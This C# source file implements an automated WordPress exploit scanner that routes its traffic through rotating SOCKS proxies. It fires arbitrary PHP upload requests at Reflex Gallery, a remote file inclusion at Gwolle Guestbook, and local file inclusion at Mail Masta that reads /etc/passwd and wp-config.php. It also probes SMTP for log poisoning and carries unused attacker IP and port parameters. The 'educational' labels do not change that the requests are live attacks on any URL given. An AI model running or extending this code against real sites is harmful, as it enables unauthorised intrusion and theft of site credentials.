using AnalyzeDomains.Domain.Enums;
using AnalyzeDomains.Domain.Interfaces.Analyzers;
using AnalyzeDomains.Domain.Interfaces.Services;
using AnalyzeDomains.Domain.Models.AnalyzeModels;
using Microsoft.Extensions.Logging;
using System.Net.Sockets;
using System.Text;
using System.Collections.Concurrent;

namespace AnalyzeDomains.Infrastructure.Analyzers
{
    /// <summary>
    /// Advanced WordPress plugin vulnerability analyzer based on penetration testing techniques.
    /// This analyzer implements educational security testing methods for research purposes only.
    /// </summary>
    public class AdvancedWordPressExploitAnalyzer : IWordPressPluginVulnerabilityAnalyzer
    {
        private readonly ISocksService _socksService;
        private readonly ILogger<AdvancedWordPressExploitAnalyzer> _logger;
        
        // Thread-safe collections for concurrent operations
        private readonly ConcurrentBag<PluginVulnerability> _discoveredVulnerabilities = new();
        private readonly SemaphoreSlim _concurrencyLimiter;

        // Known exploitation patterns based on security research
        private readonly Dictionary<string, ExploitPattern> _exploitPatterns = new()
        {
            ["reflex-gallery"] = new ExploitPattern
            {
                Name = "Reflex Gallery File Upload",
                VulnerabilityType = "Arbitrary File Upload",
                Severity = SeverityLevel.Critical,
                UploadEndpoint = "/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php",
                Method = "POST",
                PayloadType = "Multipart Form Data",
                IndicatorStrings = new[] { "qqfile", "FileUploader" }
            },
            ["gwolle-gb"] = new ExploitPattern
            {
                Name = "Gwolle Guestbook RFI",
                VulnerabilityType = "Remote File Inclusion",
                Severity = SeverityLevel.High,
                UploadEndpoint = "/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php",
                Method = "GET",
                PayloadType = "URL Parameter",
                IndicatorStrings = new[] { "abspath" }
            },
            ["mail-masta"] = new ExploitPattern
            {
                Name = "Mail Masta LFI",
                VulnerabilityType = "Local File Inclusion",
                Severity = SeverityLevel.High,
                UploadEndpoint = "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php",
                Method = "GET",
                PayloadType = "URL Parameter",
                IndicatorStrings = new[] { "pl=" }
            }
        };

        public AdvancedWordPressExploitAnalyzer(
            ISocksService socksService,
            ILogger<AdvancedWordPressExploitAnalyzer> logger)
        {
            _socksService = socksService;
            _logger = logger;
            _concurrencyLimiter = new SemaphoreSlim(Environment.ProcessorCount, Environment.ProcessorCount);
        }

        public async Task<List<PluginVulnerability>> AnalyzeVulnerabilitiesAsync(string url, CancellationToken cancellationToken = default)
        {
            _logger.LogInformation("Starting advanced WordPress exploit analysis for {Url}", url);
            
            var vulnerabilities = new List<PluginVulnerability>();
            var client = await _socksService.GetHttpWithBalancedSocksConnection();

            // Perform concurrent vulnerability detection
            var tasks = _exploitPatterns.Select(async kvp =>
            {
                await _concurrencyLimiter.WaitAsync(cancellationToken);
                try
                {
                    return await AnalyzeSpecificPluginAsync(url, kvp.Key, cancellationToken);
                }
                finally
                {
                    _concurrencyLimiter.Release();
                }
            });

            var results = await Task.WhenAll(tasks);
            vulnerabilities.AddRange(results.SelectMany(r => r));

            _logger.LogInformation("Advanced analysis completed. Found {Count} vulnerabilities for {Url}", 
                vulnerabilities.Count, url);

            return vulnerabilities;
        }

        public async Task<List<PluginVulnerability>> AnalyzeSpecificPluginAsync(string url, string pluginName, CancellationToken cancellationToken = default)
        {
            var vulnerabilities = new List<PluginVulnerability>();

            if (!_exploitPatterns.TryGetValue(pluginName, out var pattern))
            {
                return vulnerabilities;
            }

            try
            {
                var client = await _socksService.GetHttpWithBalancedSocksConnection();
                
                // Check if plugin exists and is vulnerable
                var isVulnerable = await DetectVulnerabilityPattern(client, url, pattern, cancellationToken);
                
                if (isVulnerable)
                {
                    var vulnerability = new PluginVulnerability
                    {
                        PluginName = pluginName,
                        VulnerabilityType = pattern.VulnerabilityType,
                        Description = $"{pattern.Name} - Educational security research detection",
                        TargetUrl = $"{url.TrimEnd('/')}{pattern.UploadEndpoint}",
                        Severity = pattern.Severity,
                        Confidence = ConfidenceLevel.High,
                        DetectionMethod = "Advanced Pattern Analysis",
                        ExploitSuccessful = false,
                        Metadata = new Dictionary<string, object>
                        {
                            ["pattern_name"] = pattern.Name,
                            ["method"] = pattern.Method,
                            ["payload_type"] = pattern.PayloadType,
                            ["indicators"] = pattern.IndicatorStrings,
                            ["analysis_timestamp"] = DateTime.UtcNow
                        }
                    };

                    vulnerabilities.Add(vulnerability);
                    _discoveredVulnerabilities.Add(vulnerability);
                    
                    _logger.LogWarning("Potential {VulnerabilityType} detected in {Plugin} at {Url}", 
                        pattern.VulnerabilityType, pluginName, url);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error during advanced analysis of {Plugin} at {Url}", pluginName, url);
            }

            return vulnerabilities;
        }

        public async Task<VulnerabilityExploitResult> TestReflexGalleryUploadAsync(string url, string attackerIp, int attackerPort, CancellationToken cancellationToken = default)
        {
            var result = new VulnerabilityExploitResult
            {
                TargetUrl = url,
                VulnerabilityType = "Reflex Gallery Arbitrary File Upload",
                Method = "Educational File Upload Test"
            };

            try
            {
                var client = await _socksService.GetHttpWithBalancedSocksConnection();
                
                // Construct the upload URL with year/month parameters as in the Gemini code
                var currentYear = DateTime.Now.Year;
                var currentMonth = DateTime.Now.Month.ToString("D2");
                var uploadUrl = $"{url.TrimEnd('/')}/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year={currentYear}&Month={currentMonth}";
                
                // Create a harmless test payload for educational purposes
                var testPayload = $"<?php /*Educational test - {DateTime.UtcNow}*/ echo 'SECURITY_TEST_MARKER'; ?>";

                using var formData = new MultipartFormDataContent();
                formData.Add(new StringContent(testPayload), "qqfile", "security_test.php");

                _logger.LogInformation("Testing Reflex Gallery upload endpoint: {UploadUrl}", uploadUrl);
                
                var response = await client.PostAsync(uploadUrl, formData, cancellationToken);
                var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                result.Success = response.IsSuccessStatusCode;
                result.Details = result.Success 
                    ? "Upload endpoint accessible - potential vulnerability confirmed"
                    : $"Upload test failed - Status: {response.StatusCode}";
                
                result.ResponseData = new Dictionary<string, object>
                {
                    ["status_code"] = (int)response.StatusCode,
                    ["response_length"] = responseContent.Length,
                    ["upload_url"] = uploadUrl,
                    ["test_timestamp"] = DateTime.UtcNow
                };

                if (result.Success)
                {
                    _logger.LogWarning("Reflex Gallery upload vulnerability confirmed at {Url}", url);
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Details = $"Error during upload test: {ex.Message}";
                _logger.LogError(ex, "Error testing Reflex Gallery upload at {Url}", url);
            }

            return result;
        }

        public async Task<VulnerabilityExploitResult> TestGwolleGuestbookRfiAsync(string url, string attackerIp, int attackerPort, CancellationToken cancellationToken = default)
        {
            var result = new VulnerabilityExploitResult
            {
                TargetUrl = url,
                VulnerabilityType = "Gwolle Guestbook RFI",
                Method = "Educational RFI Detection"
            };

            try
            {
                var client = await _socksService.GetHttpWithBalancedSocksConnection();
                
                // Use a safe test URL that returns predictable content
                var testRemoteUrl = "https://httpbin.org/user-agent";
                var vulnerableUrl = $"{url.TrimEnd('/')}/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath={Uri.EscapeDataString(testRemoteUrl)}";

                _logger.LogInformation("Testing Gwolle Guestbook RFI endpoint: {VulnerableUrl}", vulnerableUrl);
                
                var response = await client.GetAsync(vulnerableUrl, cancellationToken);
                var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);

                // Analyze response for signs of successful file inclusion
                var hasRemoteContent = responseContent.Contains("user-agent") || responseContent.Contains("httpbin");
                
                result.Success = response.IsSuccessStatusCode && hasRemoteContent;
                result.Details = result.Success 
                    ? "RFI vulnerability confirmed - remote file inclusion detected"
                    : "RFI test inconclusive - no clear signs of file inclusion";
                
                result.ResponseData = new Dictionary<string, object>
                {
                    ["status_code"] = (int)response.StatusCode,
                    ["response_length"] = responseContent.Length,
                    ["remote_content_detected"] = hasRemoteContent,
                    ["test_url"] = vulnerableUrl,
                    ["test_timestamp"] = DateTime.UtcNow
                };

                if (result.Success)
                {
                    _logger.LogWarning("Gwolle Guestbook RFI vulnerability confirmed at {Url}", url);
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Details = $"Error during RFI test: {ex.Message}";
                _logger.LogError(ex, "Error testing Gwolle Guestbook RFI at {Url}", url);
            }

            return result;
        }

        public async Task<VulnerabilityExploitResult> TestMailMastaLfiAsync(string url, string attackerIp, int attackerPort, CancellationToken cancellationToken = default)
        {
            var result = new VulnerabilityExploitResult
            {
                TargetUrl = url,
                VulnerabilityType = "Mail Masta LFI + Log Poisoning",
                Method = "Educational LFI Detection with SMTP Log Analysis"
            };

            try
            {
                // First attempt: Test basic LFI
                var lfiResult = await TestBasicLfi(url, cancellationToken);
                
                // Second attempt: Test SMTP log poisoning capability (educational detection only)
                var smtpResult = await TestSmtpLogPoisoningCapability(url, attackerIp, cancellationToken);

                result.Success = lfiResult.success || smtpResult.accessible;
                result.Details = BuildLfiTestDetails(lfiResult, smtpResult);
                result.ResponseData = new Dictionary<string, object>
                {
                    ["lfi_test"] = lfiResult,
                    ["smtp_test"] = smtpResult,
                    ["test_timestamp"] = DateTime.UtcNow
                };

                if (result.Success)
                {
                    _logger.LogWarning("Mail Masta LFI vulnerability patterns detected at {Url}", url);
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Details = $"Error during LFI test: {ex.Message}";
                _logger.LogError(ex, "Error testing Mail Masta LFI at {Url}", url);
            }

            return result;
        }

        private async Task<bool> DetectVulnerabilityPattern(HttpClient client, string url, ExploitPattern pattern, CancellationToken cancellationToken)
        {
            try
            {
                var testUrl = $"{url.TrimEnd('/')}{pattern.UploadEndpoint}";
                var response = await client.SendAsync(new HttpRequestMessage(HttpMethod.Head, testUrl), cancellationToken);
                
                // Consider it vulnerable if the endpoint exists (returns 200, 403, or 500)
                return response.IsSuccessStatusCode || 
                       response.StatusCode == System.Net.HttpStatusCode.Forbidden ||
                       response.StatusCode == System.Net.HttpStatusCode.InternalServerError;
            }
            catch
            {
                return false;
            }
        }

        private async Task<(bool success, string details)> TestBasicLfi(string url, CancellationToken cancellationToken)
        {
            try
            {
                var client = await _socksService.GetHttpWithBalancedSocksConnection();
                
                // Test common LFI payloads
                var testPaths = new[] { "/etc/passwd", "/proc/version", "../wp-config.php" };
                
                foreach (var path in testPaths)
                {
                    var lfiUrl = $"{url.TrimEnd('/')}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl={Uri.EscapeDataString(path)}";
                    var response = await client.GetAsync(lfiUrl, cancellationToken);
                    var content = await response.Content.ReadAsStringAsync(cancellationToken);
                    
                    // Check for signs of successful file inclusion
                    if (content.Contains("root:") || content.Contains("DB_NAME") || content.Contains("Linux version"))
                    {
                        return (true, $"LFI successful with path: {path}");
                    }
                }
                
                return (false, "No clear LFI indicators found");
            }
            catch (Exception ex)
            {
                return (false, $"LFI test error: {ex.Message}");
            }
        }

        private async Task<(bool accessible, string details)> TestSmtpLogPoisoningCapability(string url, string attackerIp, CancellationToken cancellationToken)
        {
            try
            {
                // Test if SMTP is accessible for log poisoning (educational detection only)
                var hostUri = new Uri(url);
                var targetHost = hostUri.Host;
                
                using var tcpClient = new TcpClient();
                await tcpClient.ConnectAsync(targetHost, 25, cancellationToken);
                
                if (tcpClient.Connected)
                {
                    return (true, "SMTP service accessible - log poisoning potentially feasible");
                }
            }
            catch (Exception ex)
            {
                return (false, $"SMTP test failed: {ex.Message}");
            }
            
            return (false, "SMTP service not accessible");
        }

        private string BuildLfiTestDetails((bool success, string details) lfiResult, (bool accessible, string details) smtpResult)
        {
            var details = new StringBuilder();
            details.AppendLine("Educational LFI Analysis Results:");
            details.AppendLine($"- Basic LFI: {(lfiResult.success ? "DETECTED" : "Not Found")} - {lfiResult.details}");
            details.AppendLine($"- SMTP Log Poisoning Capability: {(smtpResult.accessible ? "POSSIBLE" : "Not Available")} - {smtpResult.details}");
            
            if (lfiResult.success && smtpResult.accessible)
            {
                details.AppendLine("- COMBINED RISK: High - Both LFI and SMTP access detected");
            }
            
            return details.ToString();
        }

        private class ExploitPattern
        {
            public string Name { get; set; } = string.Empty;
            public string VulnerabilityType { get; set; } = string.Empty;
            public SeverityLevel Severity { get; set; }
            public string UploadEndpoint { get; set; } = string.Empty;
            public string Method { get; set; } = string.Empty;
            public string PayloadType { get; set; } = string.Empty;
            public string[] IndicatorStrings { get; set; } = Array.Empty<string>();
        }
    }
}
